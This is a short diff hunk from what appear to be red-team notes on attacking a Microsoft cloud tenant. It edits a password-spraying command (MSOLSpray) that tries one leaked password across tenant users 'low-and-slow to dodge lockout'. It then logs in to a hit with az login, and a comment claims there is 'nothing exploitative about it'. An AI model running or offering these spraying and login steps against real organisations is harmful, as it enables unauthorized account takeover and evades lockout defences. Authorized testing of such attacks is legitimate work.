@@ -21,7 +21,7 @@ preferred target; where modern auth is enforced this pairs with the AiTM route
 
 ```sh
 # spray a single leaked password across tenant users, low-and-slow to dodge lockout
-MSOLSpray --userlist users.txt --password '<leaked-pass>'
+python3 MSOLSpray.py --userlist users.txt --password '<leaked-pass>'
 # then just sign in with the hit — nothing exploitative about it
 az login -u <user>@<tenant>.onmicrosoft.com -p '<leaked-pass>'
 ```
